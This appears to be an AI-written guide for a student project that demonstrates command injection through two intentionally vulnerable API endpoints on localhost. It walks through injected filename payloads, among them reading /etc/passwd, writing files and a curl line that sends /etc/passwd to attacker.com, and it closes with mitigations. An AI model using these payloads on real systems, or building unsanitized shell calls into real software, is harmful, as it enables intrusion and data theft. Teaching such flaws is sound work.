# Command Injection Demo Guide

## 🎯 Overview

Two new vulnerable API endpoints have been created for demonstrating command injection attacks:

1. **`/api/backup`** - System backup functionality (tar command)
2. **`/api/optimize`** - Image optimization (ImageMagick convert command)

Both endpoints are **intentionally vulnerable** to command injection for educational purposes.

---

## 📁 Files Created

1. **`pages/api/backup.js`** - Vulnerable backup API
2. **`pages/api/optimize.js`** - Vulnerable image optimization API  
3. **`pages/admin/tools.js`** - Admin interface for testing

---

## 🚀 Access the Admin Tools

1. **Login as admin** (if not already logged in)
2. **Navigate to:** `http://localhost:3000/admin/tools`
3. **Or add link in admin dashboard**

---

## 🧪 Testing Command Injection

### Test 1: Backup API - Basic Command Injection

**Normal Usage:**
- Filename: `site_data.tar`
- Click "Run System Backup"
- Executes: `tar -cvf site_data.tar .`

**Command Injection:**
- Filename: `backup.tar; whoami`
- Click "Run System Backup"
- Executes: `tar -cvf backup.tar; whoami .`
- **Result:** Shows current user!

**More Injection Examples:**
```
backup.tar; ls -la
backup.tar; pwd
backup.tar; cat /etc/passwd
backup.tar; dir (Windows)
backup.tar; ipconfig (Windows)
backup.tar; echo "pwned" > hacked.txt
```

### Test 2: Optimize API - Basic Command Injection

**Normal Usage:**
- Image File: `banner.jpg`
- Click "Optimize Hero Image"
- Executes: `convert banner.jpg -resize 1920x1080 optimized_banner.jpg`

**Command Injection:**
- Image File: `banner.jpg; whoami`
- Click "Optimize Hero Image"
- Executes: `convert banner.jpg; whoami -resize 1920x1080 optimized_banner.jpg; whoami`
- **Result:** Shows current user!

**More Injection Examples:**
```
banner.jpg; ls -la
banner.jpg; pwd
banner.jpg; cat /etc/passwd
banner.jpg; dir (Windows)
banner.jpg; echo "pwned" > hacked.txt
```

---

## 🎯 Attack Scenarios

### Scenario 1: Information Disclosure
```
Filename: backup.tar; whoami
Result: Shows server user account
```

### Scenario 2: File System Access
```
Filename: backup.tar; ls -la /etc
Result: Lists sensitive system files
```

### Scenario 3: Data Exfiltration
```
Filename: backup.tar; cat /etc/passwd
Result: Shows system user accounts
```

### Scenario 4: Remote Code Execution
```
Filename: backup.tar; curl http://attacker.com/steal?data=$(cat /etc/passwd)
Result: Sends sensitive data to attacker's server
```

### Scenario 5: Backdoor Installation
```
Filename: backup.tar; echo "malicious code" > /tmp/backdoor.sh
Result: Creates backdoor file on server
```

---

## 📝 Windows vs Linux Commands

### Windows Commands:
```bash
dir              # List files (instead of ls)
type file.txt    # View file (instead of cat)
ipconfig         # Network info (instead of ifconfig)
whoami           # Current user
systeminfo       # System information
```

### Linux/Mac Commands:
```bash
ls -la           # List files
cat file.txt     # View file
ifconfig         # Network info
whoami           # Current user
uname -a         # System information
```

---

## ⚠️ Security Issues Demonstrated

### 1. Command Injection
- **Problem:** User input directly inserted into shell commands
- **Impact:** Arbitrary command execution
- **Fix:** Use parameterized commands, input validation, whitelisting

### 2. No Input Sanitization
- **Problem:** Special characters (`;`, `|`, `&`, `$`, etc.) not escaped
- **Impact:** Command chaining and injection
- **Fix:** Sanitize input, escape special characters

### 3. No Command Whitelisting
- **Problem:** Any command can be executed
- **Impact:** Full system compromise
- **Fix:** Whitelist allowed commands only

### 4. Error Messages Expose Details
- **Problem:** Error messages show command output
- **Impact:** Information disclosure
- **Fix:** Generic error messages, proper logging

---

## 🔧 For Your FYP Report

### Attack Chain:
```
1. Attacker accesses admin tools
2. Enters malicious input in filename field
3. Input inserted into shell command
4. Command executed on server
5. Output returned to attacker
6. Server compromised
```

### Vulnerabilities:
1. ✅ Command Injection (unsanitized input)
2. ✅ No input validation
3. ✅ Direct command execution
4. ✅ Information disclosure via output

### Impact:
- **Critical:** Remote Code Execution (RCE)
- **Data Theft:** Can read any file
- **System Control:** Execute any command
- **Persistence:** Install backdoors

### Mitigation:
1. **Input Validation:**
   - Whitelist allowed characters
   - Reject special characters
   - Validate file extensions

2. **Command Sanitization:**
   - Use parameterized commands
   - Escape special characters
   - Use command whitelisting

3. **Least Privilege:**
   - Run commands with minimal permissions
   - Use sandboxed environments
   - Implement command timeouts

4. **Monitoring:**
   - Log all command executions
   - Alert on suspicious patterns
   - Review logs regularly

---

## ✅ Quick Test

1. **Go to:** `http://localhost:3000/admin/tools`

2. **Test Backup:**
   - Filename: `backup.tar; whoami`
   - Click "Run System Backup"
   - See user in output!

3. **Test Optimize:**
   - Image File: `banner.jpg; dir`
   - Click "Optimize Hero Image"
   - See directory listing!

---

## 📸 For Demo Video

1. Show admin tools page
2. Enter normal filename → Show normal execution
3. Enter malicious filename with `; whoami` → Show command injection
4. Show output displaying command result
5. Explain the vulnerability and impact

The command injection vulnerabilities are now ready for your demo! 🎉
